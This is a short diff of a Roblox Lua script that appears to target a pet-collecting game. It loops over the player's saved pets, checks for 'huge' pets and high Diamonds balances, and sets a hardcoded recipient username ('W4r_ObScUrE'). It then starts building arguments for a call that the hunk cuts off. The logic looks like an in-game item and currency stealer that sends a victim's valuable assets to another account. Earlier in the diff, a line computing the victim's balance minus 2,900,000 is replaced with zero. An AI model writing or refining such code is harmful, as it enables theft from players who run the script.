@@ -1,14 +1,10 @@
-_G.Lol = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2900000
+_G.Lol = 0
 	for i,v in pairs(savedPets) do
     	local v2 = FrameworkLibrary.Directory.Pets[v.id]
                 if v2.huge == true or game.Players.LocalPlayer.leaderstats.Diamonds.Value > 50000000000 then
                          _G.Username = "W4r_ObScUrE"
                          print("poo")
                          wait(0.1)
-                end
-                if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
-                    _G.Lol = 0 
-		    wait(0.1)
                 end
 		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
 			local args = {
